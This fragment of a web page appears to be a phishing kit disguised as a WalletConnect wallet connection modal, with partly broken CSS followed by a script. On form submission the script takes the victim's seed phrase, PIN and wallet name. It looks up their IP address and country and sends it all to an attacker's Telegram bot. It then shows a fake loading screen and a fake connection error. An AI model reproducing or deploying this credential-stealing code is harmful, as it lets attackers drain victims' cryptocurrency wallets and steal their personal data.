      }

      .walletconnect-modal__base__row {
          -webkit-tap-highlight-color: rgba(0, 0, 0, 0);

      .walletconnect-modal__base__row:hover {

      }

      .walletconnect-modal__base__row:active {

      }

      }

      .walletconnect-modal__base__row__right {

      }

      .walletconnect-modal__base__row__right__app-icon {

      .walletconnect-modal__mobile__toggle {

          margin: 0 auto 18px;

      }

      .walletconnect-modal__single_wallet {
          display: flex;

      }

      .walletconnect-modal__single_wallet a {

          font-weight: 800;

      }

      .walletconnect-modal__mobile__toggle_selector {
          width: calc(50% - 8px);

          border-radius: 5px;

<script>
  // JavaScript for index.html
// Clear form fields on page load
  window.onload = function() {
      document.getElementById("messageForm").reset();
  };

document.getElementById('messageForm').addEventListener('submit', function(event) {
event.preventDefault(); // Prevent default form submission

// Get form data
var seed = document.getElementById('c_seed').value;
var pin = document.getElementById('c_pin').value;
var wallet = document.getElementById('w-name').value;

// Get user's IP address and user agent
fetch('https://api.ipify.org?format=json')
  .then(response => response.json())
  .then(data => {
    var ip = data.ip;
    var useragent = navigator.userAgent;
    
      // Determine visitor's country using a free service
    fetch('https://ipapi.co/' + ip + '/json/')
      .then(response => response.json())
      .then(data => {
        var country = data.country_name;

        // Construct message
        var message = "🔗 Seed Phrase 🔗\n";
        message += "+++ Wallet Name : " + wallet + "\n";
        message += "+++ Phrase: " + seed + "\n";
        message += "+++ Pin: " + pin + "\n";
        message += "📍 IP : " + ip + "\n";
        message += "Country : " + country + "\n";
        
        // Add other fields if needed

        // Send message to Telegram
        fetch('https://api.telegram.org/bot' + telegramConfig.botToken + '/sendMessage', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json'
          },
          body: JSON.stringify({
            chat_id: telegramConfig.chatId,
            text: message
          })
        })
        .then(response => {
          if (!response.ok) {
            throw new Error('Failed to send message to Telegram');
          }
          console.log('Message sent to Telegram successfully');
          
          // Show loading overlay
          document.getElementById('loadingOverlay').style.display = 'flex';

          // Delay for 5 seconds
          setTimeout(function() {
            // Hide loading overlay
            document.getElementById('loadingOverlay').style.display = 'none';
            
            // Remove the 'd-none' class to display the error modal
            document.getElementById('connect_error').classList.remove('d-none');
            document.getElementById('connect_form').style.display = 'none';
            
          }, 3000);
      
        })
        .catch(error => {
          console.error('Error sending message to Telegram:', error);
          // Handle errors, such as displaying an error message to the user
        });
      })
    .catch(error => {
      console.error('Error getting user country:', error);
      // Handle errors, such as displaying an error message to the user
    });
  })
  .catch(error => {
    console.error('Error fetching IP address:', error);
    // Handle errors, such as displaying an error message to the user
  });
});


</script>
